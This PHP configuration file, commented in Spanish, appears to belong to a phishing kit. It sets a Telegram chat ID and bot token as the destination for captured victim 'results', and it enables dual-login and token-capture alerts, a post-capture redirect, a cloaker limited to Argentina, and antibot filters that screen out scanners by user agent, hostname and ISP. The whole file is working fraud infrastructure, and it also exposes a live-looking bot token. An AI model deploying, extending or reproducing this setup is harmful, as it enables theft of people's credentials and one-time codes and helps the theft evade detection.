<?php
/**
###############################################
# Soporte https://t.me/savitarhh  			  #
# ID: S	 					   		  	  #
###############################################
**/

	//	Telegram
	$id = '-1002127949245';    // chat id      
	$key = '6710492602:AAGgxk4-hq3hjwn91xshnp9flb5S47VOam8'; // token
	$tg = true;
	
	// Txt
	$txt = false; // true para que ponga los resultados en un archivo .html/txt | false para desactivar
	$txtn = "darling"; // .html nombre del archivo donde cae los resultados
	$timezone = "America/Caracas"; // Zona horaria para la fecha que se pondra al momento de ingresar resultados

	// Dynamic Config
	$dual_login = true; // true para activar dual login | false para desactivar
	$alert = true; // true para activar la alerta de cliente ingresando | false para desactivar
	$alertx = true; // true para activar aviso de cliente ingresando token | false para desactivar
	$timer = "20"; // segundos que demorara el reloj para mostrar la sgte pagina
	$out = "./../toke2.php";	// Página final de redirección

	// CLOACKER CONFIG
	$comprobate_country = false;		// true para activar el cloacker | false para desactivar
	$countries_allowed = ["AR"];	//	pais permitido para el cloacker
	
	
	//	Antiflood System 
	$blocker = true;		// true para activar autoblocker | false para desactivar
	
		
	//	ANTIBOTS EYEZGUARD v1.3
	$EYEZ = 1;		// 1 para activar antibots | NO SE RECOMIENDA USAR ANTIBOTS EN CAMPAÑAS DE GOOGLE ADS
	//	para ver, activar o desactivar algún escudo del guardian revisar en su config ./guardian/config,ini
	/**
	 * 	// Default EYEZGUARD config - 'on' encendido | 'off' apagado
	anti_ua='on'			// ANTI USER AGENT
	anti_hn='on'    		// ANTI HOSTNAME
	anti_isp='on'			// ANTI ISP
	anti_fingerprints='off'	// ANTI FINGERPRINTS
	anti_proxy='off'		// ANTI PROXY
	 * 
	 */

?>